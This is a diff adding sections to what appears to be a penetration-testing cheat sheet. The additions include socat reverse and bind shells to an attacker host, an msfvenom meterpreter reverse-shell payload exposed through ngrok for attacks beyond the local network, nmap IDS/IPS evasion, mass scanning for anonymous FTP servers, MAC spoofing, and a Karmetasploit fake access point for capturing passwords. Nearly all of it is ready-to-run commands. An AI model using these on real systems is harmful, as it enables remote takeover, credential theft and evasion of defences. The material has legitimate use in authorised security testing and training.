@@ -68,6 +68,13 @@ $ ip neigh
 
 $ nmap -Pn -sV -6 fe80::20c0 -e eth0 --packet-trace
 ```
+
+Utilize `ndp` to enumerate all of the current ndp entries.
+
+```
+$ ndp -an
+```
+
 ## Nmap to Evaluate HTTPS Support:
 
 ```
@@ -116,6 +123,22 @@ Usage:
 
 ```
 nmap -sV --script=vulscan/vulscan.nse www.rosesecurity.com
+```
+
+## IDS/IPS Nmap Evasion:
+
+Low and slow (-T2), Fast mode (-F), Append random data to sent packets (--data-length), Randomize hosts, and verbosely conduct service detection on a file of hosts and output to XML.
+
+```
+nmap -T2 -F --data-length 5 --randomize-hosts -sV -v -iL (targets.txt) -oX (output.xml)
+```
+
+## Finding Open FTP Servers:
+
+Finding FTP servers that allow anonymous logons can assist in numerous red-teaming activities such as Nmap FTP bounce scans.
+
+```
+masscan -p 21 <IP Range> -oL ftp_servers.txt; nmap -iL ftp_servers.txt —script ftp-anon -oL open_ftp_servers.txt
 ```
 
 ## Scalable Heartbleed Hunting with Shodan:
@@ -222,6 +245,36 @@ ncat -vC --ssl www.target.org 443
 openssl s_client -crlf -connect www.target.org:443
 ```
 
+## Socat:
+
+Reverse shell:
+
+On the attack platform:
+
+```
+root@attacker# socat file:`tty`,raw,echo=0 tcp-listen:5555
+```
+
+On the victim platform:
+
+```
+user@victim $ socat tcp-connect:<Attacker IP>:5555 exec:/bin/sh,pty,stderr,setsid,sigint,sane
+```
+
+Bind shell:
+
+On the attack platform:
+
+```
+root@attacker# socat FILE:`tty`,raw,echo=0 TCP:<Target IP>:5555
+```
+
+On the victim platform:
+
+```
+user@victim $ socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
+```
+
 ## Java:
 
 ```
@@ -274,6 +327,18 @@ Look for users with a UID of 0:
 
 ```
 user@RoseSecurity $ grep :0: /etc/passwd
+```
+
+## Changing MAC Addresses:
+
+Look up vendor MAC you want to impersonate: https://mac2vendor.com/
+
+Change MAC:
+
+```
+sudo ifconfig <interface-name> down
+sudo ifconfig <interface-name> hw ether <new-mac-address> 
+sudo ifconfig <interface-name> up
 ```
 
 # Routers:
@@ -367,6 +432,31 @@ meterpreter> search -f config*
 meterpreter> search -f *.rar
 meterpreter> search -f *.docx
 meterpreter> search -f *.sql
+```
+
+Attack outside of the LAN with ngrok:
+
+First step, set up a free account in ngrok then start ngrok:
+
+```
+./ngrok tcp 9999
+
+# Forwarding tcp://0.tcp.ngrok.io:19631 -> localhost:9999
+```
+
+Create malicious payload:
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=19631 -f exe > payload.exe
+```
+Start listener:
+
+```
+use exploit/multi/handler 
+set PAYLOAD windows/meterpreter/reverse_tcp 
+set LHOST 0.0.0.0 set 
+LPORT 9999 
+exploit
 ```
 
 # Confluence CVE-2022-26134:
@@ -486,3 +576,55 @@ imf: email contents
 smb: Windows network share file
 tftp: Unsecured file
 ```
+
+## Rogue APs with Karmetasploit:
+
+Karmetasploit is a great function within Metasploit, allowing you to fake access points, capture passwords, harvest data, and conduct browser attacks against clients.
+
+Install Karmetasploit configuration:
+
+```
+root@RoseSecurity:~# wget https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt
+root@RoseSecurity:~# apt update
+```
+
+Install and configure sqlite and DHCP server:
+
+```
+root@RoseSecurity:~# apt -y install isc-dhcp-server
+root@RoseSecurity:~# vim /etc/dhcp/dhcpd.conf
+root@RoseSecurity:~# apt -y install libsqlite3-dev
+root@RoseSecurity:~# gem install activerecord sqlite3
+```
+
+Now we are ready to go. First off, we need to locate our wireless card, then start our wireless adapter in monitor mode with airmon-ng. Afterwards we use airbase-ng to start a new wireless network.
+
+```
+# Locate interface
+root@RoseSecurity:~# airmon-ng
+
+# Start monitoring
+root@RoseSecurity:~# airmon-ng start wlan0
+
+# Start AP
+root@RoseSecurity:~# airbase-ng -P -C 30 -e "Fake AP" -v wlan0mon
+
+# Assign IP to interface
+root@RoseSecurity:~# ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
+```
+
+Before we run our DHCP server, we need to create a lease database, then we can get it to listening on our new interface.
+
+```
+root@RoseSecurity:~# touch /var/lib/dhcp/dhcpd.leases
+root@RoseSecurity:~# dhcpd -cf /etc/dhcp/dhcpd.conf at0
+```
+
+Run Karmetasploit:
+
+```
+root@RoseSecurity:~# msfconsole -q -r karma.rc_.txt
+```
+
+At this point, we are up and running. All that is required now is for a client to connect to the fake access point. When they connect, they will see a fake ‘captive portal’ style screen regardless of what website they try to connect to. You can look through your output, and see that a wide number of different servers are started. From DNS, POP3, IMAP, to various HTTP servers, we have a wide net now cast to capture various bits of information.
+
